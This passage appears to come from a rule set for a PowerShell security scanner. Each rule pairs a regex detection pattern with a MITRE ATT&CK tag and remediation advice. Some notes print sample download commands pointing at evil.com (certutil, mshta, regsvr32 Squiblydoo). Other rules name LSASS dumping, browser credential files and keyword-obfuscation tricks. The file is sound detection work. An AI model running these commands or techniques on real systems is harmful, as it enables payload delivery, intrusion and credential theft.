- MITRE-T1027
rule:
  kind: expression
  pattern: '''(Am|si|Ut|ils|Context|Buffer|InitFailed)''\\+.*

    '
note: 'String concatenation breaks up keywords to evade static string matching.

  Pattern: ''Am''+''si'' = ''Amsi''


  Remediation:

  - Implement deobfuscation before analysis

  - Use AST-based detection instead of string matching

  - Monitor runtime behavior patterns

  - Detect reflection and P/Invoke calls regardless of string splitting

  '
---
id: powershell-cwe-94-base64-encoded-bypass
language: powershell
severity: error
message: 'CWE-94: Base64 encoded AMSI bypass hides malicious code'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1140
rule:
  kind: expression
  pattern: \[Convert\]::FromBase64String.*(Assembly|SetValue|GetField)
note: 'Base64 encoding hides AMSI bypass code from signature detection.

  Attackers use layered encoding to evade analysis.


  Remediation:

  - Decode and analyze all Base64 content

  - Implement behavioral detection

  - Monitor for assembly loading and reflection patterns

  - Use memory scanning tools

  '
---
id: powershell-cwe-94-execution-policy-bypass
language: powershell
severity: error
message: 'CWE-94: Execution policy bypass allows unsigned scripts to run'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1059.001
- LOLBAS
rule:
  kind: command_invocation
  pattern: (-ExecutionPolicy|-ep|-exec)\s+[Bb]ypass
note: 'Bypassing execution policy disables a fundamental PowerShell safety feature.

  This indicates deliberate circumvention of security controls.


  Remediation:

  - Enforce execution policy via GPO (cannot be overridden)

  - Monitor for bypass attempts

  - Use signed scripts only

  - Implement code signing enforcement

  - Use constrained language mode

  '
---
id: powershell-cwe-94-alternative-execution
language: powershell
severity: error
message: 'CWE-94: Alternative execution methods bypass script execution policy'
tags:
- security
- defense-evasion
- CWE-94
rule:
  kind: pipeline
  pattern: (Get-Content|type).*\.ps1\s*\|.*(Invoke-Expression|powershell)
note: 'Multiple techniques exist to run scripts without relying on script execution.

  Reading scripts with Get-Content and piping to IEX bypasses execution policy.


  Common patterns:

  - Get-Content script.ps1 | Invoke-Expression

  - [IO.File]::ReadAllText + IEX

  - Encoded command via -EncodedCommand


  Remediation:

  - Implement application control

  - Monitor process command lines

  - Restrict script file access

  - Block Get-Content piped to execution cmdlets

  '
---
id: powershell-cwe-94-encoded-command
language: powershell
severity: error
message: 'CWE-94: Base64 encoded commands hide malicious intent'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1027
rule:
  kind: command_invocation
  pattern: (-EncodedCommand|-enc|-e)\s+[A-Za-z0-9+/=]{20,}
note: 'Base64 encoded commands hide content from casual inspection and some detection
  tools.

  Attackers commonly use -EncodedCommand for malware delivery.


  Remediation:

  - Decode and analyze all encoded commands

  - Log decoded content

  - Monitor for suspicious encoding patterns

  - Use script block logging to capture decoded scripts

  '
---
id: powershell-cwe-94-powershell-downgrade
language: powershell
severity: error
message: 'CWE-94: PowerShell v2 downgrade evades modern security features'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562.001
rule:
  kind: command_invocation
  pattern: powershell\s+(-version|-v)\s+2
note: 'Downgrading to PowerShell 2.0 disables modern security features:

  - No ScriptBlock logging

  - No AMSI integration

  - No constrained language mode

  - Older .NET framework


  Remediation:

  - Remove PowerShell 2.0 from systems

  - Monitor for downgrade attempts

  - Disable remote access to old versions

  - Use PowerShell 7+ core in production

  '
---
id: powershell-cwe-94-registry-run-persistence
language: powershell
severity: error
message: 'CWE-94: Registry Run keys establish persistence across reboots'
tags:
- security
- persistence
- CWE-94
- MITRE-T1547.001
rule:
  kind: registry_modification
  pattern: HKCU?:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
note: 'Registry Run keys execute programs on user login, providing persistence.

  This is a primary malware persistence technique.


  Remediation:

  - Monitor Run key modifications

  - Implement registry auditing

  - Whitelist legitimate Run keys

  - Use GPO to manage Run keys

  - Monitor startup processes

  '
---
id: powershell-cwe-94-registry-service-creation
language: powershell
severity: error
message: 'CWE-94: Registry service creation establishes SYSTEM-level persistence'
tags:
- security
- persistence
- CWE-94
- MITRE-T1543.003
rule:
  kind: registry_modification
  pattern: HKLM:\\SYSTEM\\CurrentControlSet\\Services
note: 'Creating Windows services via registry runs code with SYSTEM privileges and
  survives reboots.

  This is a critical persistence technique.


  Remediation:

  - Monitor service registry keys

  - Use proper service management APIs

  - Implement registry ACLs

  - Audit service creation

  - Monitor for unusual service names

  '
---
id: powershell-cwe-94-registry-policy-modification
language: powershell
severity: error
message: 'CWE-94: Registry policy modification disables security features'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1112
rule:
  kind: registry_modification
  pattern: HKLM:\\SOFTWARE\\Policies
note: 'Attackers disable security features through policy registry keys.

  Common targets: Windows Defender, UAC, Firewall policies.


  Remediation:

  - Protect policy registry keys with ACLs

  - Monitor for policy modifications

  - Use GPO for policy enforcement

  - Implement registry monitoring

  - Block policy changes for non-admin users

  '
---
id: powershell-cwe-94-com-hijacking
language: powershell
severity: error
message: 'CWE-94: COM object hijacking enables persistence or privilege escalation'
tags:
- security
- persistence
- CWE-94
- MITRE-T1546.015
rule:
  kind: registry_modification
  pattern: HKCU?:\\Software\\Classes\\CLSID
note: 'Replacing COM object DLL paths causes execution when the object is instantiated.

  Used for both persistence and privilege escalation.


  Remediation:

  - Monitor CLSID registry modifications

  - Implement COM object allowlists

  - Use registry ACLs to protect COM objects

  - Audit COM object instantiation

  '
---
id: powershell-cwe-94-environment-variable-path-hijack
language: powershell
severity: warning
message: 'CWE-94: PATH environment modification enables trojanized executable execution'
tags:
- security
- persistence
- CWE-94
- MITRE-T1574.007
rule:
  kind: environment_modification
  pattern: (SetEnvironmentVariable|HKLM:\\SYSTEM\\.*Environment).*PATH
note: 'Modifying PATH can cause malicious executables to run instead of legitimate
  ones.

  Prepending malicious paths to PATH causes trojaned versions to be found first.


  Remediation:

  - Monitor environment variable changes

  - Protect Environment registry key

  - Use absolute paths for critical executables

  - Implement application control

  '
---
id: powershell-cwe-94-wmi-process-creation
language: powershell
severity: error
message: 'CWE-94: WMI process creation used for lateral movement'
tags:
- security
- lateral-movement
- CWE-94
- MITRE-T1047
rule:
  kind: method_call
  pattern: (Invoke-WmiMethod|\[WMIClass\]).*Win32_Process.*Create
note: 'WMI process creation is used for lateral movement and remote code execution.

  Attackers use this to execute commands on remote systems.


  Remediation:

  - Monitor WMI process creation (Event ID 4688)

  - Restrict WMI access

  - Implement network segmentation

  - Use JEA to restrict allowed operations

  - Monitor for unusual WMI activity

  '
---
id: powershell-cwe-94-wmi-event-subscription
language: powershell
severity: error
message: 'CWE-94: WMI event subscriptions provide persistent code execution'
tags:
- security
- persistence
- CWE-94
- MITRE-T1546.003
rule:
  kind: method_call
  pattern: (__EventFilter|__EventConsumer|CommandLineEventConsumer|Register-WmiEvent)
note: 'WMI subscriptions survive reboots and execute code without visible processes.

  Attackers use this for stealthy persistence.


  Remediation:

  - Monitor WMI subscription creation

  - Audit __EventFilter and __EventConsumer classes

  - Block WMI event subscriptions via policy

  - Monitor for suspicious trigger conditions

  '
---
id: powershell-cwe-94-wmi-remote-query
language: powershell
severity: warning
message: 'CWE-94: WMI queries against remote systems used for reconnaissance'
tags:
- security
- reconnaissance
- CWE-94
- MITRE-T1047
- MITRE-T1018
rule:
  kind: command_invocation
  pattern: (Get-WmiObject|Get-CimInstance).*-ComputerName
note: 'WMI queries enumerate processes, users, software on remote systems.

  Attackers use this for network reconnaissance.


  Remediation:

  - Restrict remote WMI access

  - Monitor for unusual query patterns

  - Baseline normal WMI queries

  - Implement network segmentation

  '
---
id: powershell-cwe-94-wmi-namespace-manipulation
language: powershell
severity: error
message: 'CWE-94: Custom WMI namespaces used to hide persistence'
tags:
- security
- persistence
- CWE-94
- MITRE-T1546.003
rule:
  kind: method_call
  pattern: (__Namespace|root\\default|root\\subscription)
note: 'Attackers create custom namespaces to store malicious WMI objects.

  This hides persistence mechanisms from standard WMI enumeration.


  Remediation:

  - Audit WMI namespaces

  - Monitor for non-standard namespace creation

  - Implement allowlists for standard namespaces

  - Regular WMI inspection

  '
---
id: powershell-cwe-95-certutil-download
language: powershell
severity: error
message: 'CWE-95: CertUtil for file download or Base64 decode'
tags:
- security
- malware-distribution
- CWE-95
- MITRE-T1105
- LOLBAS
rule:
  kind: command_invocation
  pattern: certutil\s+(-urlcache|-split|-decode)
note: 'CertUtil is a LOLBin used to download files while evading detection.

  Attackers use it to extract and decode payloads.


  Common usage:

  - certutil -urlcache -split -f "http://evil.com/malware.exe"

  - certutil -decode encoded.txt payload.exe


  Remediation:

  - Monitor certutil.exe usage

  - Restrict to legitimate certificate operations only

  - Block network access from certutil

  - Use allowlists for legitimate operations

  '
---
id: powershell-cwe-95-mshta-script-execution
language: powershell
severity: error
message: 'CWE-95: Mshta.exe executes HTA files or inline scripts with system access'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1218.005
- LOLBAS
rule:
  kind: command_invocation
  pattern: 'mshta\s+.*http|mshta\s+.*vbscript:|mshta\s+.*javascript:'
note: 'Mshta runs HTML applications with full system access.

  Used for initial access and privilege escalation.


  Common attacks:

  - mshta http://evil.com/payload.hta

  - mshta vbscript:Execute("...")

  - mshta javascript:...


  Remediation:

  - Block mshta.exe execution

  - Monitor for suspicious mshta usage

  - Implement application control

  - Use attack surface reduction rules

  '
---
id: powershell-cwe-95-rundll32-execution
language: powershell
severity: error
message: 'CWE-95: Rundll32.exe executes DLLs or scripts'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1218.011
- LOLBAS
rule:
  kind: command_invocation
  pattern: rundll32\s+.*(javascript:|http|shell32)
note: 'Rundll32 loads arbitrary DLLs and executes JavaScript.

  Common LOLBAS technique for defense evasion.


  Remediation:

  - Monitor rundll32 command lines

  - Restrict unusual rundll32 usage

  - Block network access from rundll32

  - Use application control

  '
---
id: powershell-cwe-95-regsvr32-scrobj-execution
language: powershell
severity: error
message: 'CWE-95: Regsvr32 with scrobj.dll executes COM scriptlets (Squiblydoo)'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1218.010
- LOLBAS
rule:
  kind: command_invocation
  pattern: regsvr32\s+.*(/s|/n|/u|/i:|http).*scrobj
note: 'Regsvr32 downloads and executes SCT files with full privileges.

  Known as the Squiblydoo attack.


  Pattern: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll


  Remediation:

  - Monitor regsvr32 usage

  - Block network access from regsvr32

  - Disable scrobj.dll if not needed

  - Implement application control

  '
---
id: powershell-cwe-95-wmic-process-creation
language: powershell
severity: error
message: 'CWE-95: WMIC creates processes locally or remotely for lateral movement'
tags:
- security
- lateral-movement
- CWE-95
- MITRE-T1047
- LOLBAS
rule:
  kind: command_invocation
  pattern: wmic\s+.*(process.*create|/node:|/user:|/password:)
note: 'WMIC provides command-line WMI access for lateral movement.

  Used to execute code on local or remote systems.


  Remediation:

  - Disable WMIC if not needed

  - Monitor WMIC command lines

  - Restrict to administrative users

  - Implement network monitoring

  '
---
id: powershell-cwe-95-bitsadmin-download
language: powershell
severity: warning
message: 'CWE-95: BitsAdmin downloads files in background'
tags:
- security
- malware-distribution
- CWE-95
- MITRE-T1197
- LOLBAS
rule:
  kind: command_invocation
  pattern: (bitsadmin|Start-BitsTransfer).*(/transfer|addfile|download)
note: 'BITS transfers persist across reboots and evade network monitoring.

  Used to download malware without obvious network activity.


  Remediation:

  - Monitor BITS jobs

  - Restrict bitsadmin usage

  - Implement network monitoring

  - Use Windows Defender exclusion auditing

  '
---
id: powershell-cwe-95-msbuild-execution
language: powershell
severity: error
message: 'CWE-95: MSBuild compiles and executes inline C# code'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1127.001
- LOLBAS
rule:
  kind: command_invocation
  pattern: msbuild\s+.*(\.(csproj|xml)|Task|UsingTask)
note: 'MSBuild executes arbitrary code embedded in project files.

  Attackers abuse this for initial access and privilege escalation.


  Remediation:

  - Monitor MSBuild execution

  - Restrict with application control

  - Inspect project files

  - Baseline legitimate MSBuild usage

  '
---
id: powershell-cwe-95-installutil-bypass
language: powershell
severity: error
message: 'CWE-95: InstallUtil executes code via DLL installers'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1218.004
- LOLBAS
rule:
  kind: command_invocation
  pattern: InstallUtil\s+.*(\.(dll)|/U|/u)
note: 'InstallUtil executes code in DLL Install/Uninstall methods.

  Used to bypass execution policy and application control.


  Remediation:

  - Monitor InstallUtil usage

  - Block with application control

  - Inspect DLL sources

  - Restrict to trusted locations

  '
---
id: powershell-cwe-95-vbscript-execution
language: powershell
severity: warning
message: 'CWE-95: VBScript/JScript execution via cscript/wscript'
tags:
- security
- code-execution
- CWE-95
- MITRE-T1059.005
- MITRE-T1059.007
rule:
  kind: command_invocation
  pattern: (cscript|wscript)\s+.*(/E:|\.(vbs|js))
note: 'Windows Script Host is used for initial access and persistence.

  VBScript and JScript can access system APIs.


  Remediation:

  - Disable Windows Script Host if not needed

  - Monitor script execution

  - Block script file access

  - Baseline legitimate usage

  '
---
id: powershell-cwe-94-virtualalloc-shellcode
language: powershell
severity: error
message: 'CWE-94: VirtualAlloc allocates executable memory for shellcode injection'
tags:
- security
- code-execution
- CWE-94
- MITRE-T1055
rule:
  kind: method_call
  pattern: VirtualAlloc(Ex)?.*0x(3000|40)
note: 'Allocating executable memory with PAGE_EXECUTE_READWRITE indicates shellcode
  injection.

  0x3000 = MEM_COMMIT | MEM_RESERVE

  0x40 = PAGE_EXECUTE_READWRITE


  Remediation:

  - Monitor API calls

  - Implement behavioral detection

  - Use kernel patch protection

  - Monitor for suspicious memory allocations

  '
---
id: powershell-cwe-94-createremotethread-injection
language: powershell
severity: error
message: 'CWE-94: CreateRemoteThread creates threads in remote processes'
tags:
- security
- code-execution
- CWE-94
- MITRE-T1055.003
rule:
  kind: method_call
  pattern: (CreateRemoteThread|NtCreateThreadEx|RtlCreateUserThread)
note: 'Remote thread creation in another process is a classic injection technique.

  Used for process injection and privilege escalation.


  Remediation:

  - Monitor cross-process thread creation

  - Implement API hooking

  - Use kernel patch protection

  - Monitor for suspicious thread creation

  '
---
id: powershell-cwe-94-openprocess-high-access
language: powershell
severity: error
message: 'CWE-94: OpenProcess with PROCESS_ALL_ACCESS indicates credential dumping'
tags:
- security
- credential-theft
- CWE-94
- MITRE-T1003.001
rule:
  kind: method_call
  pattern: OpenProcess.*(0x1F0FFF|PROCESS_ALL_ACCESS).*lsass
note: 'Opening LSASS with PROCESS_ALL_ACCESS enables credential dumping.

  Used to extract cached credentials and hashes.


  Remediation:

  - Enable Credential Guard

  - Use Process Integrity to protect LSASS

  - Monitor process access events

  - Enable Protected Process Light (PPL)

  '
---
id: powershell-cwe-94-minidump-lsass
language: powershell
severity: error
message: 'CWE-94: MiniDump creates LSASS memory dumps for credential extraction'
tags:
- security
- credential-theft
- CWE-94
- MITRE-T1003.001
rule:
  kind: method_call
  pattern: (MiniDumpWriteDump|procdump.*-ma|dbghelp.*MiniDump)
note: 'LSASS memory dumps contain cached credentials and hashes.

  Primary technique for offline credential dumping.


  Remediation:

  - Enable Credential Guard

  - Use Protected Process Light

  - Monitor for dump creation

  - Restrict memory access to LSASS

  - Implement anti-debugging

  '
---
id: powershell-cwe-94-scheduled-task-persistence
language: powershell
severity: error
message: 'CWE-94: Scheduled tasks provide persistence across reboots'
tags:
- security
- persistence
- CWE-94
- MITRE-T1053.005
rule:
  kind: command_invocation
  pattern: (New-ScheduledTask|Register-ScheduledTask|schtasks.*/create)
note: 'Scheduled tasks run with specified privileges and persist.

  Attackers create hidden tasks to maintain persistence.


  Remediation:

  - Audit scheduled task creation

  - Monitor for suspicious actions

  - Baseline legitimate tasks

  - Implement change control

  - Restrict task creation to admins

  '
---
id: powershell-cwe-94-scheduled-task-hijacking
language: powershell
severity: error
message: 'CWE-94: Scheduled task modification hijacks existing tasks'
tags:
- security
- persistence
- CWE-94
- MITRE-T1053.005
rule:
  kind: command_invocation
  pattern: (Set-ScheduledTask|schtasks.*/change).*Windows
note: 'Hijacking legitimate system tasks provides stealth persistence.

  Attackers modify existing tasks to run malicious code.


  Remediation:

  - Protect system scheduled tasks

  - Monitor for task modifications

  - Implement task access controls

  - Audit task changes

  '
---
id: powershell-cwe-95-dns-exfiltration
language: powershell
severity: error
message: 'CWE-95: DNS queries used for command and control or data exfiltration'
tags:
- security
- exfiltration
- CWE-95
- MITRE-T1071.004
rule:
  kind: command_invocation
  pattern: (Resolve-DnsName|nslookup).*(-Type TXT|\[Net\.Dns\]::GetHost)
note: 'DNS traffic evades network monitoring and firewalls.

  Attackers encode commands and data in DNS queries.


  Remediation:

  - Monitor DNS query patterns

  - Implement DNS filtering

  - Block suspicious domains

  - Baseline DNS activity

  - Monitor for unusual query volume

  '
---
id: powershell-cwe-95-http-exfiltration
language: powershell
severity: warning
message: 'CWE-95: HTTP POST requests exfiltrate data to attacker servers'
tags:
- security
- exfiltration
- CWE-95
- MITRE-T1041
rule:
  kind: command_invocation
  pattern: Invoke-WebRequest.*-Method POST.*-Body|UploadString|UploadData
note: 'Stolen data is sent via HTTP to attacker-controlled servers.

  Used for data exfiltration and command delivery.


  Remediation:

  - Monitor outbound HTTP traffic

  - Implement data loss prevention

  - Use HTTPS monitoring

  - Baseline legitimate uploads

  - Implement proxy inspection

  '
---
id: powershell-cwe-95-cloud-storage-exfiltration
language: powershell
severity: error
message: 'CWE-95: Cloud storage APIs used to exfiltrate data'
tags:
- security
- exfiltration
- CWE-95
- MITRE-T1567.002
rule:
  kind: uri
  pattern: (api\.dropbox|storage\.googleapis|blob\.core\.windows|s3\.amazonaws)
note: 'Cloud storage blends with legitimate traffic and evades detection.

  Attackers exfiltrate data to Dropbox, Google Drive, AWS S3, Azure Blob.


  Remediation:

  - Monitor cloud API access

  - Implement CASB (Cloud Access Security Broker)

  - Block unauthorized cloud services

  - Monitor for large uploads

  - Implement API rate limiting

  '
---
id: powershell-cwe-94-etw-bypass
language: powershell
severity: error
message: 'CWE-94: ETW bypass disables Event Tracing for Windows logging'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562.006
rule:
  kind: method_call
  pattern: (EtwEventWrite|NtTraceEvent|etwProviderGuid|EventWrite)
note: 'ETW provides deep visibility into system and application behavior.

  Disabling ETW blinds security monitoring.


  Remediation:

  - Protect ETW providers

  - Monitor for bypass attempts

  - Use kernel-mode ETW

  - Implement behavioral detection

  - Baseline ETW activity

  '
---
id: powershell-cwe-94-defender-exclusion
language: powershell
severity: error
message: 'CWE-94: Windows Defender exclusions added for malware protection evasion'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562.001
rule:
  kind: command_invocation
  pattern: (Add-MpPreference.*-ExclusionPath|Set-MpPreference.*-DisableRealtime)
note: 'Attackers exclude malware paths from Defender scanning.

  Disabling real-time monitoring evades detection.


  Remediation:

  - Protect Defender settings with GPO

  - Monitor for exclusion additions

  - Require admin approval for exclusions

  - Audit exclusion changes

  - Use Defender API restrictions

  '
---
id: powershell-cwe-94-firewall-rule-manipulation
language: powershell
severity: error
message: 'CWE-94: Firewall rules modified to allow malicious traffic'
tags:
- security
- defense-evasion
- CWE-94
- MITRE-T1562.004
rule:
  kind: command_invocation
  pattern: (New-NetFirewallRule.*-Action Allow|netsh.*firewall.*add|Disable-NetFirewallRule)
note: 'Attackers open ports for C2 and lateral movement.

  Firewall modification indicates post-exploitation activity.


  Remediation:

  - Monitor firewall rule changes

  - Implement change control

  - Use GPO to lock firewall settings

  - Audit rule modifications

  - Baseline legitimate rules

  '
---
id: powershell-cwe-94-event-log-clearing
language: powershell
severity: error
message: 'CWE-94: Event logs cleared to destroy forensic evidence'
tags:
- security
- evidence-destruction
- CWE-94
- MITRE-T1070.001
rule:
  kind: command_invocation
  pattern: (Clear-EventLog|wevtutil.*cl|Remove-EventLog|\[System\.Diagnostics\.EventLog\]::Delete)
note: 'Log clearing removes forensic artifacts and indicators of compromise.

  Indicates active cover-up of malicious activity.


  Remediation:

  - Forward logs to SIEM (immutable)

  - Protect log files with ACLs

  - Monitor for log clearing attempts

  - Alert on suspicious log changes

  - Implement log retention policies

  '
---
id: powershell-cwe-94-timestomping
language: powershell
severity: warning
message: 'CWE-94: File timestamps modified to evade forensic timeline analysis'
tags:
- security
- evidence-destruction
- CWE-94
- MITRE-T1070.006
rule:
  kind: method_call
  pattern: \[IO\.File\]::(SetCreationTime|SetLastWriteTime|SetLastAccessTime)
note: 'Timestomping makes malicious files appear older than they are.

  Evades timeline-based forensic analysis.


  Remediation:

  - Use forensic tools that detect timestomping

  - Monitor file timestamp changes

  - Compare multiple timestamp sources

  - Use filesystem journaling

  - Implement file integrity monitoring

  '
---
id: powershell-cwe-94-ad-enumeration
language: powershell
severity: warning
message: 'CWE-94: Active Directory enumeration for reconnaissance'
tags:
- security
- reconnaissance
- CWE-94
- MITRE-T1087.002
- MITRE-T1069.002
rule:
  kind: command_invocation
  pattern: (Get-ADUser|Get-ADComputer|Get-ADGroup|\[ADSI\]|DirectorySearcher|Get-ADDomainController)
note: 'AD enumeration provides valuable information for lateral movement.

  Attackers map domain structure, users, groups, and trust relationships.


  Remediation:

  - Implement AD tiering

  - Monitor for bulk queries

  - Baseline legitimate enumeration

  - Restrict AD query permissions

  - Use AD hardening guidelines

  '
---
id: powershell-cwe-94-network-discovery
language: powershell
severity: warning
message: 'CWE-94: Network scanning and host discovery'
tags:
- security
- reconnaissance
- CWE-94
- MITRE-T1018
rule:
  kind: command_invocation
  pattern: (Test-NetConnection|Test-Connection|arp -a|Get-NetNeighbor|\[Net\.Dns\]::GetHostEntry)
note: 'Network scanning identifies targets for exploitation.

  Attackers map network topology, services, and vulnerabilities.


  Remediation:

  - Monitor for scanning patterns

  - Implement network segmentation

  - Baseline network activity

  - Use intrusion detection

  - Monitor for port scans

  '
---
id: powershell-cwe-94-process-enumeration
language: powershell
severity: warning
message: 'CWE-94: Process enumeration to identify security tools'
tags:
- security
- reconnaissance
- CWE-94
- MITRE-T1057
rule:
  kind: command_invocation
  pattern: (Get-Process|tasklist|Get-WmiObject Win32_Process).*defender|sentinel|crowdstrike
note: 'Process listing reveals security tools and interesting targets.

  Attackers enumerate processes to find detection opportunities.


  Remediation:

  - Baseline normal enumeration

  - Monitor for suspicious patterns

  - Hide security tool processes

  - Implement process hiding

  '
---
id: powershell-cwe-94-security-tool-detection
language: powershell
severity: warning
message: 'CWE-94: Security tool detection indicates attack preparation'
tags:
- security
- reconnaissance
- CWE-94
- MITRE-T1518.001
rule:
  kind: command_invocation
  pattern: (Get-Service.*Defender|Get-Process.*(MsSense|csfalcon)|Get-WmiObject.*AntiVirus)
note: 'Specifically checking for security tools indicates attack preparation.

  Attackers may attempt to disable or bypass detection.


  Remediation:

  - Protect security tool processes

  - Monitor for enumeration

  - Implement decoys

  - Use honeypots

  '
---
id: powershell-cwe-94-screenshot-capture
language: powershell
severity: error
message: 'CWE-94: Screenshots captured for data collection'
tags:
- security
- data-collection
- CWE-94
- MITRE-T1113
rule:
  kind: method_call
  pattern: (\[Drawing\.Graphics\]::FromImage|CopyFromScreen|System\.Windows\.Forms\.Screen)
note: 'Screenshots capture sensitive information visible on screen.

  Used to steal credentials, documents, and business data.


  Remediation:

  - Monitor screen capture APIs

  - Implement screen content filtering

  - Use code integrity

  - Monitor for suspicious API usage

  '
---
id: powershell-cwe-94-clipboard-access
language: powershell
severity: warning
message: 'CWE-94: Clipboard accessed for data theft'
tags:
- security
- data-collection
- CWE-94
- MITRE-T1115
rule:
  kind: method_call
  pattern: (\[Windows\.Forms\.Clipboard\]::GetText|Get-Clipboard)
note: 'Clipboard may contain passwords, credit cards, or sensitive data.

  Used to steal user input and confidential information.


  Remediation:

  - Monitor clipboard access

  - Implement clipboard isolation

  - Use privileged access workstations

  - Monitor for suspicious patterns

  '
---
id: powershell-cwe-94-keylogging
language: powershell
severity: error
message: 'CWE-94: Keylogging captures all keyboard input'
tags:
- security
- data-collection
- CWE-94
- MITRE-T1056.001
rule:
  kind: method_call
  pattern: (GetAsyncKeyState|SetWindowsHookEx|WH_KEYBOARD|keybd_event)
note: 'Keyloggers capture passwords, messages, and sensitive input.

  Complete keystroke recording enables credential theft.


  Remediation:

  - Detect keyboard hooking APIs

  - Use kernel patch protection

  - Implement behavioral detection

  - Monitor for suspicious Windows hooks

  '
---
id: powershell-cwe-94-browser-credential-theft
language: powershell
severity: error
message: 'CWE-94: Browser profile data accessed for credential theft'
tags:
- security
- data-collection
- CWE-94
- MITRE-T1555.003
rule:
  kind: file_access
  pattern: (AppData.*Chrome.*Login Data|AppData.*Firefox.*cookies|cookies\.sqlite)
note: 'Browsers store passwords, cookies, and session tokens.

  Stealing profile data gives attackers account access.


  Common targets:

  - Chrome: Login Data, Cookies

  - Firefox: cookies.sqlite, logins.json

  - Edge: User Data/Default


  Remediation:

  - Protect browser data directories

  - Enable browser credential encryption

  - Monitor file access

  - Implement process isolation

  '
---
id: powershell-cwe-94-string-format-obfuscation
language: powershell
severity: warning
message: 'CWE-94: Format strings evade detection by breaking up keywords'
tags:
- security
- obfuscation
- CWE-94
- MITRE-T1027
rule:
  kind: expression
  pattern: -f\s*\(.*,.*\)|\{0\}.*\{1\}
note: 'Format strings break up keywords that trigger alerts.

  Pattern: "{0}E{1}" -f ''I'',''X'' = ''IEX''


  Remediation:

  - Deobfuscate before analysis

  - Use AST-based detection

  - Monitor runtime behavior

  - Implement code execution monitoring

  '
---
id: powershell-cwe-94-character-code-obfuscation
language: powershell
severity: warning
message: 'CWE-94: Character codes hide keywords from signature matching'
tags:
- security
- obfuscation
- CWE-94
- MITRE-T1027
rule:
  kind: expression
  pattern: \[char\].*\[char\]|Replace.*[0-9]
note: 'Character codes evade keyword-based detection.

  Pattern: [char]73 + [char]69 + [char]88 = ''IEX''


  Remediation:

  - Resolve character codes

  - Monitor suspicious character combinations

  - Use behavioral detection

  - Implement AST analysis

  '
---
id: powershell-cwe-94-backtick-obfuscation
language: powershell
severity: warning
message: 'CWE-94: Backticks break up keywords to evade detection'
tags:
- security
- obfuscation
- CWE-94
- MITRE-T1027
rule:
  kind: expression
  pattern: In`v`oke|I`E`X|N`ew-Ob`ject
note: 'PowerShell allows backticks in identifiers, breaking up detection.

  Pattern: In`vo`ke-`Exp`ress`ion = Invoke-Expression


  Remediation:

  - Remove backticks for analysis

  - Use deobfuscation tools

  - Monitor after deobfuscation

  - Use AST-based detection

  '
---
id: powershell-cwe-94-variable-indirection
language: powershell
severity: warning
message: 'CWE-94: Variable indirection reconstructs commands at runtime'
tags:
- security
- obfuscation
- CWE-94
- MITRE-T1027
rule:
  kind: expression
  pattern: '\$\{.*\}|Get-Variable.*ValueOnly|\$\(\$env:'
note: 'Variables reconstruct command names at runtime, evading static analysis.

  Patterns: ${cmd}, Get-Variable -ValueOnly, $($env:var)


  Remediation:

  - Trace variable values

  - Monitor variable assignments

  - Use execution capture

  - Implement behavioral detection

  '
---
id: powershell-cwe-94-encoding-stacking
language: powershell
severity: error
message: 'CWE-94: Multiple encoding layers hide malicious intent'
tags:
- security
- obfuscation
- CWE-94
- MITRE-T1027
- MITRE-T1140
rule:
  kind: expression
  pattern: FromBase64.*Decompress|GZipStream.*FromBase64|Deflate.*FromBase64
note: 'Layered encoding (Base64 + gzip + compression) frustrates analysis.

  Multiple decoding passes required to reveal payload.


  Remediation:

  - Recursively decode all layers

  - Implement automated deobfuscation

  - Monitor decoding operations

  - Baseline encoding patterns

  '
---
id: powershell-cwe-94-uac-bypass-fodhelper
language: powershell
severity: error
message: 'CWE-94: UAC bypass using fodhelper.exe file association hijacking'
tags:
- security
- privilege-escalation
- CWE-94
- MITRE-T1548.002
rule:
  kind: registry_modification
  pattern: HKCU:\\Software\\Classes\\ms-settings.*shell\\open\\command
note: 'This UAC bypass hijacks file associations to run code with elevated privileges.

  No user prompt appears, enabling stealth privilege escalation.


  Remediation:

  - Configure UAC to "Always notify"

  - Monitor registry changes

  - Restrict registry write access

  - Use audit policies

  - Implement application control

  '
---
id: powershell-cwe-94-token-impersonation
language: powershell
severity: error
message: 'CWE-94: Security token manipulation enables privilege escalation'
tags:
- security
- privilege-escalation
- CWE-94
- MITRE-T1134
rule:
  kind: method_call
  pattern: (ImpersonateLoggedOnUser|DuplicateToken|SetThreadToken|OpenProcessToken)
note: 'Token manipulation enables privilege escalation and account takeover.

  Attackers steal or duplicate tokens to assume higher privileges.


  Remediation:

  - Enable Credential Guard

  - Monitor for token manipulation

  - Use kernel patch protection

  - Implement process integrity

  - Protect token handles

  '
---
id: powershell-cwe-94-namedpipe-impersonation
language: powershell
severity: error
message: 'CWE-94: Named pipe impersonation used for privilege escalation'
tags:
- security
- privilege-escalation
- CWE-94
- MITRE-T1134.001
rule:
  kind: method_call
  pattern: (CreateNamedPipe|ImpersonateNamedPipeClient|ConnectNamedPipe)
note: 'Potato-style attacks use named pipes to capture SYSTEM tokens.

  Allows unprivileged users to gain SYSTEM privileges.


  Remediation:

  - Monitor named pipe creation

  - Restrict SeImpersonate privilege

  - Implement Credential Guard

  - Use audit policies

  - Monitor for token capture attempts

  '
---
id: powershell-cwe-94-pssession-remote-execution
language: powershell
severity: warning
message: 'CWE-94: PowerShell remoting sessions used for lateral movement'
tags:
- security
- lateral-movement
- CWE-94
- MITRE-T1021.006
rule:
  kind: command_invocation
  pattern: (New-PSSession|Enter-PSSession|Invoke-Command -Session)
note: 'PS remoting is used for legitimate administration and lateral movement.

  Attackers establish remote sessions to execute code on target systems.


  Remediation:

  - Monitor PSSession creation

  - Implement Just Enough Administration (JEA)

  - Restrict remoting endpoints

  - Use network segmentation

  - Audit remote commands

  '
---
id: powershell-cwe-94-psexec-lateral-movement
language: powershell
severity: error
message: 'CWE-94: PsExec and admin shares enable remote code execution'
tags:
- security
- lateral-movement
- CWE-94
- MITRE-T1570
- MITRE-T1021.002
rule:
  kind: path_access
